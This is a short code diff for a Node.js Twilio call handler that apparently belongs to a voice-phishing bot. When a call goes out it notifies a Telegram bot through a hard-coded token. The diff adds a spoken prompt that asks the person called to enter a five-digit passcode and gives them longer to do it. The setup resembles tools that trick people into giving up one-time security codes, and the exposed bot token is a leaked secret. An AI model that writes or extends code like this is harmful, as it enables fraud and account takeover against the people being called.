@@ -14,10 +14,11 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.post('/outgoing-call', (req, res) => {
 axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Received outgoing call') 
   const twiml = new VoiceResponse();
+  twiml.say('Hello i am calling from a seatle please enter 5 digit passcode');
 
   twiml.gather({
     numDigits: 5,
-    timeout:10,
+    timeout:20,
     action: '/handle-key',
     method: 'POST'
   }, gatherNode => {
